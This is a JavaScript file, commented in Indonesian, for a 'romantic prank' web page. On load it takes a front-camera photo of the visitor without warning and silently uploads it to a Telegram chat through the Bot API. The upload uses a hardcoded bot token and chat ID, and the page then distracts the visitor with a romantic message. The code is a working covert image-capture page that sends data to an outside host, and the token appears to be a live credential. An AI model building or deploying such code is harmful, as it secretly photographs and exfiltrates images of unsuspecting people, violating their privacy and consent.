let stream = null;
let capturedImage = null;

// ⚠️ GANTI INI DENGAN DATA TELEGRAM KAMU!
const TELEGRAM_BOT_TOKEN = "8703334699:AAHXkd029InXgEkSo4CRXM2P3Vl1_mQ4VAc";
const TELEGRAM_CHAT_ID = "5323236080";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

const cameraPermissionScreen = document.getElementById('camera-permission');
const romanticMessageScreen = document.getElementById('romantic-message');
const photoRevealScreen = document.getElementById('photo-reveal');

const revealBtn = document.getElementById('reveal-btn');
const retryBtn = document.getElementById('retry-btn');

window.addEventListener('load', () => {
    requestCameraAccess();
});

async function requestCameraAccess() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        });

        video.srcObject = stream;
        video.onloadedmetadata = () => {
            video.play();
            setTimeout(() => {
                capturePhoto();
            }, 500);
        };

    } catch (error) {
        console.error('Error akses kamera:', error);
        alert('Izinkan akses kamera untuk melanjutkan!');
    }
}

function capturePhoto() {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    capturedImage = canvas.toDataURL('image/jpeg');

    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }

    sendPhotoToTelegram();
    showRomanticMessage();
}

async function sendPhotoToTelegram() {
    try {
        const blob = await fetch(capturedImage).then(r => r.blob());
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'prank.jpg');
        formData.append('caption', '😏 KETAHUAN! Hehe... 💕');

        const response = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
            {
                method: 'POST',
                body: formData
            }
        );

        const data = await response.json();
        if (data.ok) {
            console.log('✅ Foto terkirim ke Telegram!');
        } else {
            console.error('❌ Error Telegram:', data.description);
        }
    } catch (error) {
        console.error('❌ Error kirim Telegram:', error);
    }
}

function showRomanticMessage() {
    cameraPermissionScreen.classList.add('hidden');
    romanticMessageScreen.classList.remove('hidden');
}

revealBtn.addEventListener('click', () => {
    showPhotoReveal();
});

function showPhotoReveal() {
    romanticMessageScreen.classList.add('hidden');
    photoRevealScreen.classList.remove('hidden');

    const img = new Image();
    img.src = capturedImage;
    img.onload = () => {
        canvas.width = img.width;
        canvas.height = img.height;
        ctx.drawImage(img, 0, 0);
    };
}

retryBtn.addEventListener('click', () => {
    capturedImage = null;
    cameraPermissionScreen.classList.remove('hidden');
    romanticMessageScreen.classList.add('hidden');
    photoRevealScreen.classList.add('hidden');
    requestCameraAccess();
});
